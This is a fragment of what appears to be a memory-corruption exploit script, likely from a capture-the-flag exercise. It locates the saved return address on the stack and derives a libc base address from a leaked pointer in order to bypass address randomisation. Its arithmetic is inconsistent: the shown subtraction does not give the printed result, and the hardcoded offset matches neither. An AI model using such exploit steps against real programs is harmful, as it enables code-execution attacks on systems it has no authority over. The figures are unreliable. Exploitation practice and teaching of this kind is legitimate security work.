...
# brings us to the saved RIP for the libc function on the stack.
...
# Calc libc base
"""
In [10]: hex(0x7ffff7dc5923 - 0x7ffff7d9e000) <- libc leak - default_libc_base
Out[10]: '0x2fd5'
"""
libc_leak_offset = 0x276B5
libc_base = leak_libc - libc_leak_offset
